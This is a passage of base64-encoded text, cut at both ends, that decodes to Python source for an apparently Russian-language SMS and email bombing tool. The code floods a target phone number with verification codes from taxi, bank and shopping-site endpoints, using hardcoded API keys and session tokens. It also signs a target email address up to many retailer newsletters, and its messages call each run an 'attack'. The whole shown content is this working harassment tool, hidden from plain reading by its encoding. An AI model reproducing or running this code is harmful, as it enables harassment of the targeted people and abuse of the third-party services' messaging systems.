RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDUyNzM2OTQyMDMxMzA5MjlfMTY0MTA3NDY5ODI1MyZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9QzEzMjBCODYtOTdBOC00MDVCLUE0M0MtQTNENzk0NjVCQzVGJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ0YWtzaS5ieiUyRmxpY2huaXkta2FiaW5ldC5odG1sJndlYkNsaWVudFZlcnNpb249MjAyMTEyMjkxNzI1NDcmc3Rva2VuPTg5OGRjYjhjYTZiNmJhYmM1MDI0NDc1ZmU4NzQ2NzAxJl89MTY0MTA3NDY5ODI1NycuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vbXNrMS5zZWRpLnJ1L3dlYmFwaT9jYWxsYmFjaz1qUXVlcnkxOTEwMDk4NTE3MDE2MTM3NDg5MzFfMTY0MTA3NTQ2Mjc2NyZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9OWZkZjkzMDItMjVjYy00YTAyLWFkMWItMzM1ZGI1NmZiYjQxJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ4dGF4aS5ydSUyRiUyMytVc2VyJTI1MjBkZW5pZWQlMjUyMEdlb2xvY2F0aW9uJndlYkNsaWVudFZlcnNpb249MjAyMTEyMjkxNzI1MDQmc3Rva2VuPWU3ZDFkOWU2MDM5YWE2ZjVmYWEyNGZmZjE2YmRmNzhmJl89MTY0MTA3NTQ2Mjc3MCcuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDg2MjcxOTQ4NDYwMTM1OTdfMTY0MTA3NjI1Njk5OCZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9QTYwREE5NDAtQjlFNS00RjFCLTk3MzQtN0NDODZCOUJGMTRGJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ0YXhpLXBvLXB1dGkucnUlMkZ6YWtheiUyRiZ3ZWJDbGllbnRWZXJzaW9uPTIwMjExMjI5MTcyNTQ3JnN0b2tlbj1kMTM3MjE0OGQxZDFjOGM0ZDFkZWYyNjE3MmQzM2U0ZiZfPTE2NDEwNzYyNTcwMDUnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnJTI1MkInICsgc3RyKHBob25lKVs6LTEwXSArICclMjUyMCgnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArICclMjUyMCcgKyBzdHIocGhvbmUpWzQ6LTRdICsgJy0nICsgc3RyKHBob25lKVs3Oi0yXSArICctJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3NwYjIuc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDk3NjcyOTM1OTc4ODE0MTdfMTY0MTA3NjMzNDk0MiZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9RTkxNzI3REMtQkYxOC00MDQ2LUIzNDUtMDczOTlFQjVENzIxJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ1dGF4aS1zcGIucnUlMkYrVXNlciUyNTIwZGVuaWVkJTI1MjBHZW9sb2NhdGlvbiZ3ZWJDbGllbnRWZXJzaW9uPTIwMjExMjI5MTcyNTQ3JnN0b2tlbj03NGRhNGJkMWZmZjVhZTRhYTRkYTZiNmRjYTViMTg2NyZfPTE2NDEwNzYzMzQ5NDYnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnJTI1MkInICsgc3RyKHBob25lKVs6LTEwXSArICclMjUyMCgnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArICclMjUyMCcgKyBzdHIocGhvbmUpWzQ6LTRdICsgJy0nICsgc3RyKHBob25lKVs3Oi0yXSArICctJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5tc2suc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDUzOTM3NDEzODg4NDk0NDVfMTY0MTExMjc4NDY0MiZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9ZTlkMzY5NDYtZTkxNi00Y2FmLWI5NzctYTc4YjVjZGVhYTExJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cCUzQSUyRiUyRnd3dy50YXhpZXVyb3BsdXMucnUlMkZvbmxheW4temFrYXouaHRtbCZ3ZWJDbGllbnRWZXJzaW9uPTIwMjExMjI5MTcyNTA0JnN0b2tlbj01ZTAxOWQ3NTk4M2I3ODQxYjgyZmQ3M2NkYThhYTI0NiZfPTE2NDExMTI3ODQ2NDYnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBzdHIocGhvbmUpWzotMTBdICsgJyAnICsgc3RyKHBob25lKVsxOi03XSArICcgJyArIHN0cihwaG9uZSlbNDotNF0gKyAnICcgKyBzdHIocGhvbmUpWzc6LTJdICsgJyAnICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3NvY2lhbC5qb3VybmFsLnRpbmtvZmYucnUvYXBpL3YyMC9hY2NvdW50L2xvZ2luL3Bob25lLycsIGpzb249eyJwaG9uZSI6ZW50ZXIsInBvaW50X29mX2NvbnRhY3QiOiJoZWFkZXItbG9naW4tYnV0dG9uIn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncm91cHByaWNlLnJ1L2F1dGhfcGhvbmUvc2VuZF9waG9uZV90b2tlbicsIGRhdGE9eydwaG9uZSc6IGVudGVyLCd0aW1lX3pvbmUnOiAxODB9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJzgnICsgc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIGhlYWQgPSB7J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE1LjIgU2FmYXJpLzYwNS4xLjE1J30KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy50cmFla3RvcmlhLnJ1L2xvY2FsL2FqYXgvYXV0aG9yaXplLnBocD9hY3Rpb249MicsaGVhZGVycz1oZWFkLCBkYXRhPXsncGhvbmUnOiBlbnRlciwnYnhzZXNzaWQnOiAnMjE2NmU2OWUxOTM3Njk0ODZkNjhiY2VhODIxZjI5YmYnLCdsaWQnOiAndHInfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbJyArIEZvcmUuQ1lBTiArIHN0cihjeWNsZSkgKyBGb3JlLkJMVUUgKyAnINGG0LjQutC7INC/0YDQvtC50LTQtdC9LCDQvtGB0YLQsNC70L7RgdGMICcgKyBGb3JlLkNZQU4gKyBzdHIoY291bnQgLSBjeWNsZSkgKyBGb3JlLkJMVUUgKyAnXScpCiAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBb0JDRgtCw0LrQsCDQt9Cw0LrQvtC90YfQtdC90LBdJykKICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgb3Muc3lzdGVtKCdweXRob24gc3RhcnQucHknKQoKCmVsaWYgZW1haWwgIT0gLTE6CgogICAgcHJpbnQoRm9yZS5CTFVFICsgJyBb0J/QvtGH0YLQsCDQtNC70Y8g0LDRgtCw0LrQuF06ICcgKyBGb3JlLkNZQU4gKyBlbWFpbCkKCiAgICBpZiBjb3VudCA8PSAwOgogICAgICAgIGN5Y2xlID0gMAogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3J1LnNoZWluLmNvbS91c2VyL2F1dGgvc3Vic2NyaWJlP19sYW5nPXJ1Jl92ZXI9MS4xLjgnLCBkYXRhPXsnZW1haWwnOiBlbWFpbH0pCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LnNpbnNheS5jb20vcnUvcnUvYWp4L2N1c3RvbWVyL3JlZ2lzdGVyLz9scHBfbmV3X2xvZ2luJywgZGF0YT17J2VtYWlsJzogZW1haWwsJ2ZpcnN0bmFtZSc6ICdEbWl0cnknLCdsYXN0bmFtZSc6ICdJdmFub3YnLCdwYXNzd29yZCc6ICdXRXNkMjNTRFNkdHInLCdpc19zdWJzY3JpYmVkJzogMSwnc3Vic2NyaXB0aW9uUGxhY2UnOiAnY3VzdG9tZXJfcmVnaXN0ZXInfSkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuaG91c2VicmFuZC5jb20vcnUvcnUvYWp4L25ld3NsZXR0ZXIvc3Vic2NyaWJlLycsIGRhdGE9eydlbWFpbCc6IGVtYWlsLCdzdWJzY3JpcHRpb25QbGFjZSc6ICdmb290ZXInLCd0ZXJtcyc6IDF9KQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5sYW1vZGEucnUvc3Vic2NyaWJlL25ld3NsZXR0ZXIvJywgZGF0YT17J3VybCc6ICcvc2FsZXMvb3JkZXIvaGlzdG9yeS8nLCdlbWFpbCc6IGVtYWlsLCdsb2NhdGlvbic6ICdwb3BfdXBfbmV3X2JhcicsJ2lzX2Zyb21fcGFydG5lcic6ICdmYWxzZScsJ2dlbmRlcic6ICdNJywnc3Vic2NyaXB0aW9uX3R5cGUnOiAnREVGQVVMVCd9KQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gZW1haWwucmVwbGFjZSgnQCcsICclNDAnKQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9zdG9ja21hbm4ucnUvYWpheC8/Y29udHJvbGxlcj1zdWJzY3JpcHRpb24mYWN0aW9uPWFkZCZlbWFpbD17fSZmb3JtPWZvcm0mcm9sZXMlNUIlNUQ9bWVuJnJvbGVzJTVCJTVEPXdvbWVuJy5mb3JtYXQoZW50ZXIpKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5jcm9wcC5jb20vcnUvcnUvYWp4L25ld3NsZXR0ZXIvc3Vic2NyaWJlLycsIGRhdGE9eydlbWFpbCc6IGVtYWlsLCdzdWJzY3JpcHRpb25QbGFjZSc6ICdzaXRlX25ld3NsZXR0ZXInfSkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9pbnRlZ3JhdGlvbmFwaS5uZXQvdW5pcWxvL2FwaS9Db250YWN0cz9mb3JtYXQ9anNvbicsIGpzb249eyJQaG9uZU51bWJlciI6Ijc5MDk1MTIzMTIzIiwiR2VuZGVyIjoyLCJEYXRlT2ZCaXJ0aCI6IjE5OTItMTEtMTEgMDA6MDA6MDAuMDAwIiwiRmlyc3ROYW1lIjoiRG1pdHJ5IiwiQ29udGFjdEdyb3VwSWQiOjkxOTY3NCwiRW1haWwiOmVtYWlsfSkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93ZWIucG9wbWVjaGFuaWMucnUvd2ViL2NvbnRhY3RzLzU0MDIvP3ZpZD0xMDEzNT